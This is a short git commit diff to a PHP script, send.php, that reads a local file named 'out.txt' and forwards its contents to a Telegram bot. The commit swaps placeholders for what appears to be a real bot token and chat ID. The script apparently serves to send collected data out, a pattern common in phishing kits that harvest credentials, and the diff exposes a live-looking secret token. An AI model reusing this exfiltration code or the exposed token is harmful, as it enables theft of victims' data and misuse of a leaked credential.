9d4ed67a16befe8de8cd30e75d8e05a3cc6ba341
ezattuli120-commits <ezattuli120@gmail.com>
2026-02-11 12:52:45 +0430

    Update send.php

--- send.php
+++ send.php
@@ -1,5 +1,5 @@
 <?php
     sleep(2);
     $msg = urlencode(file_get_contents("out.txt"));
-    file_get_contents("https://api.telegram.org/botTOKEN/sendMessage?chat_id=CHATID&text=$msg");
+    file_get_contents("https://api.telegram.org/bot8240214186:AAFwvyQQxR94Oz59o7C0gRh7pEDpIqRfREc/sendMessage?chat_id=7921952022&text=$msg");
 ?>
